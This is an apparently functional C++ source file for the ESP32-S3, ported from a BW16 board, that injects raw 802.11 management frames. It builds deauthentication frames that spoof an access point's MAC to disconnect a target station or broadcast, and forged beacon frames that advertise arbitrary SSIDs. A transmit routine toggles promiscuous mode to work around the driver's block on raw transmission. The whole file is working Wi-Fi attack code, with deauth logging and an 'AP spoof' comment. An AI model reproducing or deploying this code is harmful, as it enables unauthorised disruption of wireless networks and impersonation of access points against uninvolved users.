#include "cap.h"

// ═══════════════════════════════════════════════════════════════════════════
// cap.cpp — ESP32-S3 port of BW16 packet injection implementation
//
// BW16 original: wifi_tx_raw_frame() → Realtek alloc_mgtxmitframe()
// ESP32-S3 port: wifi_tx_raw_frame() → esp_wifi_80211_tx()
//
// Both write a raw 802.11 management frame directly to the radio TX path.
// The functional semantics are identical; only the underlying driver
// binding differs.
// ═══════════════════════════════════════════════════════════════════════════

// Maximum raw management frame payload (same limit as BW16 MAX_RAW_MGMT_FRAME_BYTES = 0x68 = 104)
static const size_t MAX_RAW_MGMT_FRAME_BYTES = 0x68;

// ────────────────────────────────────────────────────────────────────────────
// wifi_tx_raw_frame()
// ESP32-S3 equivalent of the BW16 wifi_tx_raw_frame().
// Submits a caller-provided raw 802.11 management frame to the ESP32
// hardware TX queue via esp_wifi_80211_tx().
//
// Returns true if the frame was accepted by the driver.
// ────────────────────────────────────────────────────────────────────────────
bool wifi_tx_raw_frame(const void* frame, size_t length) {
    if (frame == nullptr || length == 0 || length > MAX_RAW_MGMT_FRAME_BYTES) {
        return false;
    }
    // IDF v5: esp_wifi_80211_tx returns INVALID_ARG when promiscuous mode is
    // active — the driver blocks raw TX while RX filtering is running.
    // Must toggle promiscuous around every TX call.
    esp_wifi_set_promiscuous(false);
    delayMicroseconds(500);   // let radio settle

    // In WIFI_AP_STA mode, try AP interface first (more reliable for injection)
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, length, false);
    if (err != ESP_OK) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false);
    }
    if (err != ESP_OK) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, frame, length, true);
    }

    esp_wifi_set_promiscuous(true);   // restore promiscuous

    static unsigned long lastLog = 0;
    if (millis() - lastLog > 500) {
        lastLog = millis();
        Serial.printf("[DEAUTH TX] res=%s (0x%X), len=%u\n",
                      esp_err_to_name(err), err, (unsigned int)length);
    }
    return (err == ESP_OK);
}

// ────────────────────────────────────────────────────────────────────────────
// wifi_tx_deauth_frame()
// Direct port of BW16 wifi_tx_deauth_frame().
// Builds a DeauthFrame struct and passes it to wifi_tx_raw_frame().
// ────────────────────────────────────────────────────────────────────────────
bool wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
    DeauthFrame frame;
    memset(&frame, 0, sizeof(frame));
    frame.frame_control   = 0x00C0;
    frame.duration        = 0x013A;
    frame.sequence_number = 0;
    frame.reason          = reason;
    memcpy(&frame.source,       src_mac, 6);   // Addr2: transmitting radio
    memcpy(&frame.access_point, src_mac, 6);   // Addr3: BSSID (same as source for AP spoof)
    memcpy(&frame.destination,  dst_mac, 6);   // Addr1: target STA or broadcast
    return wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

// ────────────────────────────────────────────────────────────────────────────
// wifi_tx_beacon_frame()
// Direct port of BW16 wifi_tx_beacon_frame().
// Builds a BeaconFrame struct with the given SSID and passes it to
// wifi_tx_raw_frame().
// ────────────────────────────────────────────────────────────────────────────
bool wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char* ssid) {
    BeaconFrame frame;
    memset(&frame, 0, sizeof(frame));
    frame.frame_control   = 0x0080;
    frame.duration        = 0;
    frame.sequence_number = 0;
    frame.timestamp       = 0;
    frame.beacon_interval = 0x0064;    // 100 TU
    frame.ap_capabilities = 0x0421;    // ESS + Short Preamble + Short Slot
    frame.ssid_tag        = 0;         // Element ID 0 = SSID IE
    frame.ssid_length     = 0;

    memcpy(&frame.source,       src_mac, 6);
    memcpy(&frame.access_point, src_mac, 6);
    memcpy(&frame.destination,  dst_mac, 6);

    // Copy SSID bytes — clamped to 32 bytes per 802.11 spec
    for (int i = 0; ssid[i] != '\0' && i < 32; i++) {
        frame.ssid[i] = ssid[i];
        frame.ssid_length++;
    }

    // Total frame size = fixed header (38 bytes) + SSID IE length
    // Matches BW16 original: return wifi_tx_raw_frame(&frame, 38 + frame.ssid_length)
    size_t frameLen = 38 + frame.ssid_length;
    return wifi_tx_raw_frame(&frame, frameLen);
}
